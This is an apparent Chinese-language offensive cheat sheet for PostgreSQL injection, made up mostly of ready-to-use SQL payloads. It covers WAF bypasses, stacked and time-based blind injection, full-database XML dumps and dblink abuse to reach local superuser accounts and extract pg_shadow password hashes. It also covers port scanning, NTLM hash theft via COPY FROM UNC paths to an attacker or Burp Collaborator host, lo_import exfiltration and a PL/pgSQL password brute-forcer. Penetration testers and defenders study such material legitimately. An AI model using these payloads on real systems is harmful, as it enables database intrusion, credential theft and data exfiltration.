---
attack_surface: [注入类]
impact: [远程代码执行, 信息泄露, 权限提升, NTLM 凭证窃取]
risk_level: 严重
prerequisites:
  - SQL 注入基础
  - PostgreSQL 架构与函数
difficulty: 高级
related_techniques:
  - mysql-injection
  - mssql-injection
  - oracle-injection
  - postgresql-rce
  - ssrf-server-side-request-forgery
tools:
  - sqlmap
  - Metasploit (postgres_payload)
  - Responder
---

# PostgreSQL Injection — 专项技术与提权

> 关联文档：[SQL Injection 总览](../README.md) · [PostgreSQL RCE](../PostgreSQL%20RCE.md) · [MySQL Injection](../MySQL%20Injection.md) · [MSSQL Injection](../MSSQL%20Injection.md)

---

# 0x01 WAF 绕过

## 1.1 字符串函数操纵

```sql
-- CHR 拼接 (无引号)
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);  -- → 'AWAE'

-- Dollar-quoting (替换单引号)
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```

## 1.2 Hex 编码 query_to_xml 绕过

```sql
-- 将查询转为 hex 字符串后通过 convert_from 执行
SELECT query_to_xml(convert_from('\x73656c656374...','UTF8'), true, true, '');

-- Stacked queries + Error-Based + Hex:
;SELECT query_to_xml(convert_from('\x73656c656374206361737428...','UTF8'),true,true,'')-- -

-- Boolean + Hex:
1 OR '1' = (query_to_xml(convert_from('\x...','UTF8'),true,true,''))::text-- -
```

## 1.3 堆叠查询时间盲注

```sql
-- PostgreSQL 支持堆叠查询，但多响应会触发错误
-- 绕过: 使用时间盲注
id=1; SELECT pg_sleep(10);-- -
1; SELECT CASE WHEN (SELECT current_setting('is_superuser'))='on' THEN pg_sleep(10) END;-- -
```

## 1.4 XML 一次性全库导出

```sql
-- 单表 → XML (一行)
SELECT query_to_xml('SELECT * FROM pg_user', true, true, '');

-- 全库 → XML (⚠ 可能 DoS 自己的客户端)
SELECT database_to_xml(true, true, '');
```

---

# 0x02 dblink 模块 — 网络利用

```sql
-- 加载 dblink 扩展
CREATE EXTENSION dblink;
```

## 2.1 权限提升 (pg_hba.conf 信任配置)

```sql
-- 利用本地 trust 认证以任何用户身份连接
SELECT * FROM dblink('host=127.0.0.1 user=postgres dbname=postgres',
  'SELECT datname FROM pg_database') RETURNS (result TEXT);

-- 提取密码哈希
SELECT * FROM dblink('host=127.0.0.1 user=postgres dbname=postgres',
  'SELECT usename, passwd FROM pg_shadow') RETURNS (result1 TEXT, result2 TEXT);
```

## 2.2 端口扫描

```sql
SELECT * FROM dblink_connect('host=216.58.212.238 port=443 user=name password=secret dbname=abc connect_timeout=10');

-- 错误区分:
-- Connection refused → 端口关闭
-- timeout expired → 端口过滤/超时
-- received invalid response to SSL negotiation → HTTPS 服务器
```

## 2.3 NTLM Hash 泄露 (UNC Path)

```sql
-- 通过 COPY FROM 触发 SMB 认证
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';

-- 动态 NTLM 泄露 (拼接到 Burp Collaborator)
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
  SELECT INTO userval (SELECT user);
  sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
  EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```

## 2.4 dblink + lo_import 数据外带

利用 `lo_import` 加载文件内容到大对象，再通过 `dblink_connect` 的用户名字段外带内容。

参考：[fbctf2019 hr-admin-module writeup](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

---

# 0x03 PL/pgSQL 密码暴力破解

```sql
-- 检查 PL/pgSQL 可用性
SELECT lanname, lanacl FROM pg_language WHERE lanname = 'plpgsql';

-- 4 字符暴力破解函数
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
                                username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE word TEXT;
BEGIN
  FOR a IN 65..122 LOOP
    FOR b IN 65..122 LOOP
      FOR c IN 65..122 LOOP
        FOR d IN 65..122 LOOP
          BEGIN
            word := chr(a) || chr(b) || chr(c) || chr(d);
            PERFORM(SELECT * FROM dblink(' host=' || host ||
              ' port=' || port || ' dbname=' || dbname ||
              ' user=' || username || ' password=' || word,
              'SELECT 1') RETURNS (i INT));
            RETURN word;
          EXCEPTION
            WHEN sqlclient_unable_to_establish_sqlconnection THEN
              -- do nothing
          END;
        END LOOP;
      END LOOP;
    END LOOP;
  END LOOP;
  RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';

-- 调用
SELECT brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```

> 注意：即使暴力破解 4 个字符也可能需要几分钟。可改用字典攻击。

---

# 0x04 参考资料

- [PayloadsAllTheThings — PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
- [Having Fun With PostgreSQL (original paper)](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt)
- [PostgreSQL String Functions](https://www.postgresqltutorial.com/postgresql-string-functions/)
